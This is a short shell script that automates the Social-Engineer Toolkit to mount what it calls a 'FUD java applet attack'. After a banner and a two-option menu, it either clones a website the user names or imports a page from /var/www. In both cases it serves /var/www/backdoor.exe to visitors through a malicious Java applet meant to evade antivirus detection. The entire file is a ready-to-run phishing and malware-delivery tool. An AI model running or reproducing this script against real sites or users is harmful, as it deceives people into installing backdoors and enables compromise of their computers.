#!/bin/sh
clear
echo "*************************************"
echo "       __      __   __    ___    __"
echo "      / /     / /  /  \\  / _ \\  / /"
echo "     / /     / /__/ /\\ \\/ / \\ \\/ / "
echo "    / /     / ___  /  \\  /   \\  /  "
echo "   / /_____/ /  / /   / /   / /\\ \\ "
echo "  /_________/  /_/   /_/   /_/  \\_\\"
echo ""
echo "*************************************"
echo "        FUD java apllet attack       "
echo "*************************************"
echo "1) site cloner "
echo "2) costum import (/var/www/index.html)"
echo "*************************************"
echo -n "chose attack method (1-2)"
read attack
if [ "$attack" == "1" ]; then
echo -n "Wich site would you like to clone ?"
read site
cd /pentest/exploits/set
echo "1
2
1
2
$site
14
/var/www/backdoor.exe
" >> /pentest/exploits/set/cloner.txt
./set-automate cloner.txt
rm cloner.txt
fi
if [ "$attack" == "2" ]; then
cd /pentest/exploits/set
echo "1
2
1
3
/var/www/
14
/var/www/backdoor.exe
" >> /pentest/exploits/set/cloner.txt
./set-automate cloner.txt
rm cloner.txt
fi

